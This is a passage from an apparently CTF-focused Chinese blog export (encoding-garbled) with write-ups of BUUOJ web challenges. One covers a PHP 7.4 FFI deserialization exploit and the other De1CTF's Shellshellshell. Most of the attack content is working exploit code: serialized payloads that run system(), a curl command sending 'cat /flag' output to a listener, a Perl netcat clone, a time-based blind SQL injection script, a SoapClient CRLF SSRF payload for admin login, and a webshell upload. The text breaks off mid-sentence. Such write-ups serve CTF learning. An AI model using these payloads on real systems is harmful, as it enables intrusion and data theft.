Mechanismã€‚Preloadæœºåˆ¶ç®€å•æ¥è¯´å°±æ˜¯åœ¨PHP7.4ä¸­ï¼Œå…è®¸æˆ‘ä»¬åœ¨WebæœåŠ¡è¿è¡Œå‘¨æœŸå†…æå‰é¢„åŠ è½½æŸäº›PHPæ–‡ä»¶ï¼ŒåŠ è½½çš„æ–‡ä»¶å°†åœ¨æ‰€æœ‰PHPæ–‡ä»¶ä¸­å¯ç”¨ã€‚è€Œè‡ªå®šä¹‰çš„åºåˆ—åŒ–æœºåˆ¶å°±æœ‰ç‚¹æ„æ€äº†ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç±»ä¸­é‡å†™æ–°çš„é­”æ³•å‡½æ•°ï¼š__serializeå’Œ__unserializeï¼Œunserializeçš„æ—¶å€™ä¼šè°ƒç”¨run()ï¼Œrun()è°ƒç”¨\\(data[&#39;func&#39;]æ‰€æŒ‡å‡½æ•°ï¼Œè¿”å›å€¼å†™åˆ°\\)data['ret']é‡Œï¼Œè€Œä¸”æä¾›äº†__getæ–¹æ³•å…è®¸æˆ‘ä»¬å¾—åˆ°è¿”å›å€¼ã€‚ æˆ‘ä»¬è¯•ä¸€ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phpfinal class A implements Serializable &#123; protected $data = [ &#x27;ret&#x27; =&gt; null, &#x27;func&#x27; =&gt; &#x27;print_r&#x27;, &#x27;arg&#x27; =&gt; array( &quot;123&quot;=&gt;&quot;abc&quot;, &quot;456&quot;=&gt;&quot;def&quot; ) ]; private function run () &#123; $this-&gt;data[&#x27;ret&#x27;] = $this-&gt;data[&#x27;func&#x27;]($this-&gt;data[&#x27;arg&#x27;]); &#125; public function __serialize(): array &#123; return $this-&gt;data; &#125; public function __unserialize(array $data) &#123; array_merge($this-&gt;data, $data); $this-&gt;run(); &#125; public function serialize (): string &#123; return serialize($this-&gt;data); &#125; public function unserialize($payload) &#123; $this-&gt;data = unserialize($payload); $this-&gt;run(); &#125; public function __get ($key) &#123; return $this-&gt;data[$key]; &#125; public function __set ($key, $value) &#123; throw new \\Exception(&#x27;No implemented&#x27;); &#125;&#125;$a=new A();print(base64_encode(serialize($a)).&quot;\\n&quot;);print(serialize($a));?&gt; ç„¶åè®¿é—®/?a=unserialize(base64_decode(%22QzoxOiJBIjo5MTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6NzoicHJpbnRfciI7czozOiJhcmciO2E6Mjp7aToxMjM7czozOiJhYmMiO2k6NDU2O3M6MzoiZGVmIjt9fX0=%22))-%3E__get(%27ret%27);å‘ç°æˆ‘ä»¬ç¡®å®èƒ½å¤Ÿprint_rä¸€ä¸ªæ•°ç»„ã€‚è¿™è¯å®äº†preload.phpç¡®å®è¢«é¢„åŠ è½½äº†ï¼Œç„¶åå‘¢ï¼Ÿååºåˆ—åŒ–å¯¹äºæœ¬é¢˜ç›®å‰æ²¡æœ‰ä»»ä½•ä½œç”¨ã€‚ æˆ‘ä»¬å†ç¿»PHPçš„What's Newï¼Œå‘ç°è¿˜æœ‰ä¸€æ¡ï¼šFFI(Foreign Function Interface)ï¼Œå…è®¸æˆ‘ä»¬åœ¨PHPä¸­ä½¿ç”¨Cçš„å‡½æ•°ã€‚å…·ä½“å‚è€ƒè¿™é‡Œï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨FFIç±»æ‰§è¡Œsystem()ï¼Œä»è€Œå¾—åˆ°flagã€‚å¯æ˜¯æˆ‘ä»¬åœ¨index.phpä¸­ä½¿ç”¨FFIç±»ä¸èƒ½äº§ç”Ÿæ•ˆæœï¼Œåæ¥å‘ç°PHPå¯¹äºffiæœ‰ä¸€å®šçš„é™åˆ¶ï¼Œå½“ffi.enable=preloadæ—¶ï¼ŒFFIä»…èƒ½åœ¨CLIå’Œpreloadçš„æ–‡ä»¶ä¸­ä½¿ç”¨ã€‚é‚£ä¹ˆæˆ‘ä»¬ä½¿ç”¨ååºåˆ—åŒ–çš„ç‚¹å°±å¥½äº†ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpfinal class A implements Serializable &#123; protected $data = [ &#x27;ret&#x27; =&gt; null, &#x27;func&#x27; =&gt; &#x27;FFI::cdef&#x27;, &#x27;arg&#x27; =&gt; &quot;int system(const char *command);&quot; ]; private function run () &#123; $this-&gt;data[&#x27;ret&#x27;] = $this-&gt;data[&#x27;func&#x27;]($this-&gt;data[&#x27;arg&#x27;]); &#125; public function __serialize(): array &#123; return $this-&gt;data; &#125; public function __unserialize(array $data) &#123; array_merge($this-&gt;data, $data); $this-&gt;run(); &#125; public function serialize (): string &#123; return serialize($this-&gt;data); &#125; public function unserialize($payload) &#123; $this-&gt;data = unserialize($payload); $this-&gt;run(); &#125; public function __get ($key) &#123; return $this-&gt;data[$key]; &#125; public function __set ($key, $value) &#123; throw new \\Exception(&#x27;No implemented&#x27;); &#125;&#125;$a=new A();print(base64_encode(serialize($a)).&quot;\\n&quot;);print(serialize($a));?&gt; ç„¶åè®¿é—®/?a=unserialize(base64_decode(%22QzoxOiJBIjo5NTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czozMjoiaW50IHN5c3RlbShjb25zdCBjaGFyICpjb21tYW5kKTsiO319%22))-%3E__get(%27ret%27)-%3Esystem(%22ls%22);](http://a899b5e3-3096-4f14-b6d0-8d4a282bcfc5.node2.buuoj.cn.wetolink.com:82/?a=unserialize(base64_decode(\"QzoxOiJBIjo5NTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czozMjoiaW50IHN5c3RlbShjb25zdCBjaGFyICpjb21tYW5kKTsiO319\"))-&gt;__get('ret')-&gt;system(\"ls\");)ï¼Œæ³¨æ„__get('ret')æ˜¯å¿…è¦çš„ï¼Œå› ä¸ºFFI::cdef()è¿”å›çš„å¯¹è±¡ä¿å­˜åœ¨data['ret']ä¸­ã€‚æ³¨æ„åˆ°æ²¡æœ‰å›æ˜¾ï¼Œå› ä¸ºsystemä¼šæŠŠè¾“å‡ºæ”¾åœ¨STDOUTä¸­ï¼ŒPHPæ²¡æ³•æ¥æ”¶åˆ°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°†å…¶å‘é€åˆ°VPSä¸­ã€‚http://a66c3418-bd96-47dd-aae4-e3904e2835ff.node2.buuoj.cn.wetolink.com:82/?a=unserialize(base64_decode(\"QzoxOiJBIjo5NTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czozMjoiaW50IHN5c3RlbShjb25zdCBjaGFyICpjb21tYW5kKTsiO319\"))-&gt;__get('ret')-&gt;system('curl http://172.2.0.8:5277 -d \"abc=\\cat /flag`\"');`ï¼Œç”±äºBUUOJçš„é™åˆ¶ï¼Œæˆ‘ä»¬åªèƒ½å¦å¼€ä¸€å°Linuxé¶æœºï¼Œç„¶åå€ŸåŠ©è¿™ä¸ªå‘å¤–ä¼ é€’ç»“æœäº†ã€‚åœ¨Linuxé¶æœºä¸Šç›‘å¬5277ç«¯å£ï¼Œå°±èƒ½æ”¶åˆ°flagäº†ã€‚ P.S. BUUOJä¸Šçš„Linuxé¶æœºæ²¡æœ‰ncï¼Œæˆ‘ä»¬ç”¨Perlå†™äº†ä¸ªPerlcatã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142#!/usr/bin/perluse strict;use warnings;use IO::Socket;# subroutinessub argerr($)&#123; print STDERR &quot;ERROR: &quot;.$_[0].&quot;\\n&quot;; usage();&#125;sub usage()&#123; print STDERR &quot;Usage: $0 [OPTIONS] [DESTINATION IP] PORT\\n&quot;; print STDERR &quot;Options:\\n&quot;; print STDERR &quot; -l Open and listen TCP port\\n&quot;; print STDERR &quot; -p [PORT] TCP port\\n&quot;; print STDERR &quot; -v Verbose\\n&quot;; exit 1;&#125;# mainmy $addr;my $port=9001;my $listen=0;my $verbose=0;# parse arguments...# print usage if no argumentsif($#ARGV == -1)&#123; argerr(&quot;No arguments!&quot;);&#125;# search for help argumentfor(0..$#ARGV)&#123; if($ARGV[$_] =~ m/--help/ || $ARGV[$_] =~ m/-h/) &#123; usage(); &#125;&#125;# get optionsmy $readport=0;my $readexec=0;for(0..$#ARGV)&#123; if($ARGV[$_] =~ m/^-[a-zA-Z]+/ &amp;&amp; $readport == 0)&#123; my $opts = $ARGV[$_]; $opts =~ s/^.//; foreach(split(&#x27;&#x27;, $opts))&#123; if($_ eq &quot;l&quot;)&#123; $listen=1; &#125; elsif($_ eq &quot;p&quot;)&#123; $readport=1; &#125; elsif($_ eq &quot;v&quot;)&#123; $verbose=1; &#125; &#125; &#125; elsif($readport == 1)&#123; $readport=0; if($ARGV[$_] !~ m/^\\d+$/)&#123; argerr(&quot;PORT syntax error!&quot;); &#125; $port = $ARGV[$_]; &#125;&#125;my $socket;my $connection; # mode of operationif($listen == 0)&#123; # search for an IPv4 number followed by a port number if($ARGV[$#ARGV-1] =~ m/^\\d+.\\d+.\\d+.\\d+$/ &amp;&amp; $ARGV[$#ARGV] =~ m/^\\d+$/)&#123; $addr = $ARGV[$#ARGV-1]; $port = $ARGV[$#ARGV]; &#125; if(!defined $addr) &#123;argerr(&quot;IP and PORT syntax error!&quot;);&#125; if(!defined $port) &#123;argerr(&quot;IP and PORT syntax error!&quot;);&#125; if($addr !~ m/^\\d+.\\d+.\\d+.\\d+$/ || $port !~ m/^\\d+$/)&#123; argerr(&quot;IP and PORT syntax error!&quot;); &#125; # create socket interface $socket = new IO::Socket::INET( Proto =&gt; &#x27;tcp&#x27;, PeerAddr =&gt; $addr, PeerPort =&gt; $port, Reuse =&gt; 1, Timeout =&gt; 10); die &quot;Could not create socket: $!\\n&quot; unless $socket; $connection = $socket;&#125;else &#123; # listen on port if($verbose)&#123; print STDERR &quot;Listening on port &quot;. $port .&quot;...\\n&quot;; &#125; # create socket interface $socket = new IO::Socket::INET ( LocalPort =&gt; $port, Proto =&gt; &#x27;tcp&#x27;, Listen =&gt; 1, Reuse =&gt; 1,); die &quot;Could not create socket: $!\\n&quot; unless $socket; # accept client connection my $client = $socket-&gt;accept(); if($verbose)&#123; print STDERR &quot;Connection from &quot;. $client-&gt;peerhost() .&quot;\\n&quot;; &#125; $connection = $client;&#125;# fork writerdie &quot;Can&#x27;t fork writer: $!&quot; unless defined(my $writepid = fork());# split the forkif ($writepid) &#123; # copy the socket to standard output my $buffer; while($connection-&gt;read($buffer,1))&#123; syswrite(STDOUT,$buffer,1); &#125; # SIGTERM to writer kill(&quot;TERM&quot;, $writepid);&#125;else &#123; # copy standard input to the socket my $buffer; while(sysread(STDIN, $buffer, 1))&#123; $connection-&gt;write($buffer); &#125;&#125;# close socket interfaceclose($socket);exit 0; flag{1fac1f87-62e0-44b7-9469-0f0fa01ea549}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"FFI","slug":"FFI","permalink":"http://tiaonmmn.github.io/tags/FFI/"}]},{"title":"BUUOJåˆ·é¢˜-Web-shellshellshell","slug":"BUUOJåˆ·é¢˜-Web-shellshellshell","date":"2019-09-17T11:03:00.000Z","updated":"2019-12-10T12:15:12.603Z","comments":true,"path":"2019/09/17/BUUOJåˆ·é¢˜-Web-shellshellshell/","link":"","permalink":"http://tiaonmmn.github.io/2019/09/17/BUUOJ%E5%88%B7%E9%A2%98-Web-shellshellshell/","excerpt":"De1CTF 2019çš„Shellshellshellã€‚ æ‰«ç›®å½•å‘ç°æœ‰index.php~æ–‡ä»¶ï¼Œç„¶åçŒœæµ‹ä¸€ä¸‹å…¶ä»–æ–‡ä»¶ä¹Ÿæœ‰ï¼Œç„¶åæˆ‘ä»¬å°±Downä¸‹äº†å®Œæ•´æºç ã€‚","text":"De1CTF 2019çš„Shellshellshellã€‚ æ‰«ç›®å½•å‘ç°æœ‰index.php~æ–‡ä»¶ï¼Œç„¶åçŒœæµ‹ä¸€ä¸‹å…¶ä»–æ–‡ä»¶ä¹Ÿæœ‰ï¼Œç„¶åæˆ‘ä»¬å°±Downä¸‹äº†å®Œæ•´æºç ã€‚ # Part 1. SQL Injection çœ‹ä¸€ä¸‹æºç ï¼Œå‘ç°åœ¨user.phpé‡Œçš„publish()æœ‰ä¸ªå¥‡æ€ªçš„insert: 12345678910111213141516function publish() &#123; if(!$this-&gt;check_login()) return false; if($this-&gt;is_admin == 0) &#123; if(isset($_POST[&#x27;signature&#x27;]) &amp;&amp; isset($_POST[&#x27;mood&#x27;])) &#123; $mood = addslashes(serialize(new Mood((int)$_POST[&#x27;mood&#x27;],get_ip()))); $db = new Db(); @$ret = $db-&gt;insert(array(&#x27;userid&#x27;,&#x27;username&#x27;,&#x27;signature&#x27;,&#x27;mood&#x27;),&#x27;ctf_user_signature&#x27;,array($this-&gt;userid,$this-&gt;username,$_POST[&#x27;signature&#x27;],$mood)); if($ret) return true; else return false; &#125; &#125; ç›´æ¥å¸¦å…¥\\(\\_POST[&#39;signature&#39;]ï¼Œé‚£ä¹ˆæ¥çœ‹ä¸€ä¸‹\\)db-&gt;insertçš„å®ç°ã€‚ 12345678910111213141516171819 private function get_column($columns)&#123; if(is_array($columns)) $column = &#x27; `&#x27;.implode(&#x27;`,`&#x27;,$columns).&#x27;` &#x27;; else $column = &#x27; `&#x27;.$columns.&#x27;` &#x27;; return $column;&#125;public function insert($columns,$table,$values)&#123; $column = $this-&gt;get_column($columns); $value = &#x27;(&#x27;.preg_replace(&#x27;/`([^`,]+)`/&#x27;,&#x27;\\&#x27;$&#123;1&#125;\\&#x27;&#x27;,$this-&gt;get_column($values)).&#x27;)&#x27;; $nid = $sql = &#x27;insert into &#x27;.$table.&#x27;(&#x27;.$column.&#x27;) values &#x27;.$value; $result = $this-&gt;conn-&gt;query($sql); return $result;&#125; \\(columné€šè¿‡get_column()è·å¾—ï¼Œå°†ä¼ å…¥çš„\\)columnsç»„æˆç”¨åå¼•å·åŒ…è£¹çš„å­—ç¬¦ä¸²ï¼Œå¦‚ï¼š`\\(columns[0],\\`\\)columns[1]`ï¼Œé‡ç‚¹æ˜¯\\(valueï¼Œpreg_replaceçš„æ­£åˆ™æ„æ€æ˜¯å¦‚æœåŸ\\)valueä¸å­˜åœ¨`æˆ–,ï¼Œå°±å°†åå¼•å·åŒ…è£¹çš„$valueè½¬æˆå•å¼•å·åŒ…è£¹ã€‚æ•ˆæœå¦‚ä¸‹å›¾ï¼š è¿™æ ·å°±ä¼šå¯¹SQLæ³¨å…¥å¸¦æ¥éº»çƒ¦ï¼Œå¦‚\\(values=array(&quot;admin&quot;,&quot;test&#39; or 1=1,3#&quot;);ï¼Œè¿‡get_column()å¤„ç†åå˜æˆ&quot;\\`admin\\`,\\`test&#39; or 1=1,3#\\`&quot;ï¼Œå†è¿‡preg_replaceåå˜æˆ&quot;&#39;admin&#39;,\\`test&#39; or 1=1,3#\\`&quot;ã€‚åœ¨é€—å·ä¹‹å‰æ²¡å‡ºç°å¦ä¸€ä¸ªåå¼•å·ï¼Œé€ æˆtestå‰çš„åå¼•å·æ²¡æœ‰é…å¯¹ï¼Œæ— æ³•è½¬æ¢ï¼Œä¿ç•™ä¸‹æ¥ï¼Œé€ æˆå®é™…æ‰§è¡Œçš„SQLè¯­å¥ä¸åˆæ³•ã€‚é‚£ä¹ˆæˆ‘ä»¬å¦‚æœåœ¨å…¶ä¸­æ’å…¥åå¼•å·ä¼šæ€æ ·ï¼Ÿ\\)values=array(\"admin\",\"`test' or 1=1,3#\");è¿‡get_column()å¤„ç†å˜æˆ\"`admin`,``test' or 1=1,3#`\"ï¼Œè¿‡preg_replaceå˜æˆ\"'admin',``test' or 1=1,3#`\"ï¼Œè¿˜æ˜¯ä¸å¯¹ã€‚é‚£ä¹ˆæ¢ä¸ªä½ç½®æ€æ ·ï¼Ÿ$values=array(\"admin\",\"test`' or 1=1,3#\");è¿‡get_column()å˜æˆ\"`admin`,`test`' or 1=1,3#`\"ï¼Œå†è¿‡preg_replaceå˜æˆ\"'admin','test'' or 1=1,3#`\"ï¼Œå¥½äº†æˆ‘ä»¬é€ƒé€¸å‡ºæ¥ä¸€ä¸ªå•å¼•å·ï¼Œé‚£å°±å¤Ÿäº†ã€‚ ä¸Šæ–‡æåˆ°çš„user.phpä¸­çš„publish()å…è®¸æˆ‘ä»¬ç”¨POSTæäº¤signatureï¼Œæ¡ä»¶æ»¡è¶³ï¼Œå†™è„šæœ¬å§ã€‚è¿™æ˜¯ä¸ªinsertç±»å‹æ³¨å…¥ï¼Œç”¨sleepç›²æ³¨ã€‚æ³¨å…¥çš„æ•°æ®å¤§æ¦‚ä¸º324`,3),((if(ascii(substring((select database()),1))=102,sleep(5),1)),1,2,3)#ï¼Œå¸¦å…¥SQLå°±å˜æˆäº† insert into ctf_user_signature( `userid`,`username`,`signature`,`mood` ) values ( '1','test','324',3),((if(ascii(substring((select database()),1))=102,sleep(5),1)),1,2,3)#`,'O:4:\\\"Mood\\\":3:&#123;s:4:\\\"mood\\\";i:1;s:2:\\\"ip\\\";s:11:\\\"192.168.1.4\\\";s:4:\\\"date\\\";i:1568730153;&#125;' ) 123456789101112131415161718192021222324252627import timeimport stringimport requestsheader = &#123; &quot;Cookie&quot;: &quot;PHPSESSID=2hl10o0f976664asa88vkcoeq6&quot;&#125;url = &quot;http://62614c8b-c370-493c-bb6f-1087ddf417bc.node1.buuoj.cn/index.php?action=publish&quot;result = &quot;&quot;for a in range(1, 32): for b in (string.ascii_lowercase+string.digits): data = &#123; &quot;signature&quot;: &quot;324`,3),((if(ascii(substring((select password from ctf_users where username=0x61646d696e),&#123;0&#125;,1))=&#123;1&#125;,sleep(15),1)),1,2,3)#&quot;.format(a, ord(b)), &quot;mood&quot;: 1 &#125; try: time.sleep(1) x = requests.post(url=url, headers=header, data=data, timeout=13) print(data) x.close() except requests.exceptions.Timeout: result += b break time.sleep(5) print(result) æˆ‘ä»¬å·²çŸ¥ç”¨æˆ·åä¸ºadminï¼Œç›´æ¥ä»ctf_usersè¡¨è¯»å¯†ç å¹¶ä¸”passwordä¸€å®šæ˜¯MD5å¯ä»¥é™å®šå­—ç¬¦é›†ï¼Œç”±äºç½‘ç»œé—®é¢˜å¯èƒ½å‡ºç°é”™è¯¯ï¼Œå¤šè¯•å‡ æ¬¡ã€‚å¾—åˆ°MD5ï¼šc991707fdf339958eded91331fb11ba0ï¼Œè§£å¾—jaivypasswordã€‚ Part 2. SoapClient SSRF ä½†æ˜¯æˆ‘ä»¬ç›´æ¥ç™»å½•åå‘ç°ä¸å…è®¸æˆ‘ä»¬ç™»å½•ã€‚æç¤ºï¼šYou can only login at the usual addressã€‚å›å»ç¿»æºç ã€‚ç”¨çš„get_ip()è¿”å›$_SERVER['REMOTE_ADDR']ï¼Œè¿™ä¸ªæ²¡æ³•ç»•è¿‡ã€‚æˆ‘ä»¬éœ€è¦èƒ½æœ¬åœ°è®¿é—®çš„æ–¹æ³•ï¼Œè¦ä¹ˆç»•è¿‡REMOTE_ADDRï¼Œè¦ä¹ˆæ‰¾åˆ°ä¸€å¤„SSRFï¼Œç™»å½•åè¿”å›Cookieï¼Œæˆ‘ä»¬å†ç”¨Cookieç™»å½•ã€‚ ç„¶åæ³¨æ„åˆ°publish()è¿˜æœ‰ä¸€å¤„å¥‡æ€ªçš„åœ°æ–¹ï¼š$mood = addslashes(serialize(new Mood((int)$_POST['mood'],get_ip())));ã€‚å¯ä»¥åºåˆ—åŒ–ï¼Œå½“å‰ä»£ç é‡Œæ²¡æœ‰ä»»ä½•æœ‰å…³SSRFçš„ç±»ï¼Œé‚£ä¹ˆå°±è¦è€ƒè™‘PHPæœ¬åœ°ç±»äº†ã€‚è¿™é‡Œå‚è€ƒN1CTF 2018 Easy&amp;&amp;Hard PHPï¼Œä½¿ç”¨SoapClientã€‚ 12345678910111213141516&lt;?php$headers = array( &#x27;Cookie: PHPSESSID=8qpm643062ib88mnqerme74kl4&#x27; #æˆ‘ä»¬å…ˆè®¿é—®loginé¡µé¢åˆ†é…ä¸€ä¸ªCookieï¼ŒåŒæ—¶çˆ†ç ´å¾—åˆ°éªŒè¯ç );$target = &#x27;http://a0d22f20-788f-4ba7-9960-cc8ee356962c.node1.buuoj.cn/index.php?action=login&#x27;;$post_string = &#x27;username=admin&amp;password=jaivypassword&amp;code=267234&#x27;;#åˆšæ‰çˆ†ç ´å¾—åˆ°çš„éªŒè¯ç $b = new SoapClient(null, array(&#x27;location&#x27; =&gt; $target, &#x27;user_agent&#x27; =&gt; &#x27;wupco^^Content-Type:application/x-www-form-urlencoded^^&#x27; . join(&#x27;^^&#x27;, $headers) . &#x27;^^Content-Length:&#x27; . (string)strlen($post_string) . &#x27;^^^^&#x27; . $post_string, &#x27;uri&#x27; =&gt; &quot;aaab&quot;));//å› ä¸ºuser-agentæ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨crlfæ³¨å…¥httpå¤´æ¥å‘é€postè¯·æ±‚$aaa = serialize($b);$aaa = str_replace(&#x27;^^&#x27;, &#x27;%0d%0a&#x27;, $aaa);$aaa = str_replace(&#x27;&amp;&#x27;, &#x27;%26&#x27;, $aaa);echo $aaa;?&gt; å¾—åˆ°ç»“æœO:10:\"SoapClient\":4:{s:3:\"uri\";s:4:\"aaab\";s:8:\"location\";s:81:\"http://a0d22f20-788f-4ba7-9960-cc8ee356962c.node1.buuoj.cn/index.php?action=login\";s:11:\"_user_agent\";s:171:\"wupco%0d%0aContent-Type:application/x-www-form-urlencoded%0d%0aCookie: PHPSESSID=8qpm643062ib88mnqerme74kl4%0d%0aContent-Length:49%0d%0a%0d%0ausername=admin%26password=jaivypassword%26code=267234\";s:13:\"_soap_version\";i:1;} ä¸‹é¢çš„é—®é¢˜æ˜¯æˆ‘ä»¬çš„$_POST['Mood']è¢«è½¬æˆintå¤„ç†äº†ï¼Œæ²¡æ³•æ³¨å…¥è¿›å»ã€‚ç„¶åæˆ‘ä»¬å‘ç°user.phpä¸­showmess()ä¼šå°†æ•°æ®åº“ä¸­çš„Moodè¯»å‡ºæ¥ï¼š 1234567891011121314151617181920212223242526function showmess() &#123; if(!$this-&gt;check_login()) return false; if($this-&gt;is_admin == 0) &#123; //id,sig,mood,ip,country,subtime $db = new Db(); @$ret = $db-&gt;select(array(&#x27;username&#x27;,&#x27;signature&#x27;,&#x27;mood&#x27;,&#x27;id&#x27;),&#x27;ctf_user_signature&#x27;,&quot;userid = $this-&gt;userid order by id desc&quot;); if($ret) &#123; $data = array(); while ($row = $ret-&gt;fetch_row()) &#123; $sig = $row[1]; $mood = unserialize($row[2]); $country = $mood-&gt;getcountry(); $ip = $mood-&gt;ip; $subtime = $mood-&gt;getsubtime(); $allmess = array(&#x27;id&#x27;=&gt;$row[3],&#x27;sig&#x27; =&gt; $sig, &#x27;mood&#x27; =&gt; $mood, &#x27;ip&#x27; =&gt; $ip, &#x27;country&#x27; =&gt; $country, &#x27;subtime&#x27; =&gt; $subtime); array_push($data, $allmess); &#125; $data = json_encode(array(&#x27;code&#x27;=&gt;0,&#x27;data&#x27;=&gt;$data)); return $data; &#125; else return false; &#125; æˆ‘ä»¬å°±ä¸å¿…è€ƒè™‘ç»•è¿‡intè½¬æ¢äº†ï¼Œåœ¨åˆšæ‰çš„SQLæ³¨å…¥é‚£é‡Œæˆ‘ä»¬å¯ä»¥æ’å…¥ä¸€ä¸ªMoodï¼Œæ‰€ä»¥æˆ‘ä»¬çš„Payloadä¸ºï¼š 1234567891011121314&lt;?php$target = &#x27;http://127.0.0.1/index.php?action=login&#x27;;# ä¸€å®šå¾—æ˜¯127.0.0.1ï¼ŒSSRFè¦ä»æœ¬åœ°è®¿é—®$headers = array( &#x27;Cookie: PHPSESSID=kvvs649604t498pgc5sp936oa5&#x27;# é‡æ–°åˆ†é…ä¸€ä¸ªæœªç™»é™†çš„Cookieï¼Œæå‰çˆ†ç ´å¥½éªŒè¯ç );$post_string = &#x27;username=admin&amp;password=jaivypassword&amp;code=497567&#x27;; #codeä¸ºåˆšæ‰çˆ†ç ´å¥½çš„$b = new SoapClient(null, array(&#x27;location&#x27; =&gt; $target, &#x27;user_agent&#x27; =&gt; &#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27; . join(&#x27;^^&#x27;, $headers) . &#x27;^^Content-Length: &#x27; . (string)strlen($post_string) . &#x27;^^^^&#x27; . $post_string, &#x27;uri&#x27; =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace(&#x27;^^&#x27;, &quot;\\r\\n&quot;, $aaa);$aaa = str_replace(&#x27;&amp;&#x27;, &#x27;&amp;&#x27;, $aaa);#&amp;å­—ç¬¦ä¸èƒ½æ”¹å˜echo bin2hex($aaa);?&gt; ç„¶åæ–°å»ºä¸€ä¸ªç”¨æˆ·ï¼Œæ­£å¸¸ç™»é™†ï¼Œåœ¨publishçš„æ—¶å€™æäº¤signature=q3e13`,0x4f3a31303a22536f6170436c69656e74223a343a7b733a333a22757269223b733a343a2261616162223b733a383a226c6f636174696f6e223b733a33393a22687474703a2f2f3132372e302e302e312f696e6465782e7068703f616374696f6e3d6c6f67696e223b733a31313a225f757365725f6167656e74223b733a3137333a22777570636f0d0a436f6e74656e742d547970653a206170706c69636174696f6e2f782d7777772d666f726d2d75726c656e636f6465640d0a436f6f6b69653a205048505345535349443d6b767673363439363034743439387067633573703933366f61350d0a436f6e74656e742d4c656e6774683a2034390d0a0d0a757365726e616d653d61646d696e2670617373776f72643d6a6169767970617373776f726426636f64653d343937353637223b733a31333a225f736f61705f76657273696f6e223b693a313b7d)%23&mood=1ä¸€å¤§ä¸²16è¿›åˆ¶å­—ç¬¦ä¸ºåˆšæ‰Payloadçš„ç»“æœã€‚ç„¶åè®¿é—®ä¸€ä¸‹index.phpï¼Œä¼šè¿”å›500ï¼Œæˆ‘ä»¬çš„ç›®çš„å·²ç»è¾¾åˆ°äº†ã€‚ ç”¨Payloadä¸­çš„Cookieç™»é™†ï¼Œå°±è¿›å…¥adminäº†ã€‚ publishé¡µé¢å˜ä¸ºä¸Šä¼ äº†ï¼Œæˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä»»æ„çš„æ–‡ä»¶ï¼Œæ²¡æœ‰åšä»»ä½•é™åˆ¶ã€‚æˆ‘ä»¬ä¸Šä¼ ä¸ªä¸€å¥è¯ç„¶åAntSwordè¿æ¥ã€‚ Part 3. Internat Exploit æ‰«ä¸€ä¸‹IPï¼Œåœ¨.7é‚£é‡Œæœ‰ä¸€ä¸ªindex.phpæ–‡ä»¶ï¼Œæ‹–å›æ¥çœ‹ä¸€ä¸‹ï¼š 1234567891011121314151617181920212223242526272829&lt;?php$sandbox = &#x27;/var/sandbox/&#x27; . md5(&quot;prefix&quot; . $_SERVER[&#x27;REMOTE_ADDR&#x27;]);@mkdir($sandbox);@chdir($sandbox);if($_FILES[&#x27;file&#x27;][&#x27;name&#x27;])&#123; $filename = !empty($_POST[&#x27;file&#x27;]) ? $_POST[&#x27;file&#x27;] : $_FILES[&#x27;file&#x27;][&#x27;name&#x27;]; if (!is_array($filename)) &#123; $filename = explode(&#x27;.&#x27;, $filename); &#125; $ext = end($filename); if($ext==$filename[count($filename) - 1])&#123; die(&quot;try again!!!&quot;); &#125; $new_name = (string)rand(100,999).&quot;.&quot;.$ext; move_uploaded_file([&#x27;file&#x27;][&#x27;tmp_name&#x27;],$new_name); $_ = $_POST[&#x27;hello&#x27;]; if(@substr(file($_)[0],0,6)===&#x27;@&lt;?php&#x27;)&#123; if(strpos($_,$new_name)===false) &#123; include($_); &#125; else &#123; echo &quot;you can do it!&quot;; &#125; &#125; unlink($new_name);&#125;else&#123; highlight_file(__FILE__);&#125; è€é¢˜äº†ï¼Œå¦‚æœ\\(ext==\\)filename[count($filename) - 1]ï¼Œdie()ï¼Œ\\(filenameå¯ä»¥ç›´æ¥ä¼ å…¥ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä¼ ä¸ªfile[0]ä¸file[1]ï¼Œé—®é¢˜åœ¨äºend()ï¼Œend()è¿”å›æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œä½†å¹¶ä¸æ˜¯æŒ‰ç…§æ•°ç»„ç´¢å¼•çš„é¡ºåºæ’åˆ—çš„ï¼Œè€Œæ˜¯æŒ‰ç…§èµ‹å€¼é¡ºåºã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¼ å…¥file[1]=aaa,file[0]=bbbï¼Œæ–‡ä»¶åä¸ºbbb.aaaï¼Œend()è¿”å›çš„æ˜¯bbbï¼Œç¬¬ä¸€ä¸ªdieå°±å¯ä»¥ç»•è¿‡äº†ã€‚ç„¶åæ˜¯å°†ä¼ å…¥çš„æ–‡ä»¶é‡å‘½åæˆ000-999ä¹‹é—´éšæœºçš„æ•°å­—+\\)extã€‚ç„¶åunlink()åˆ 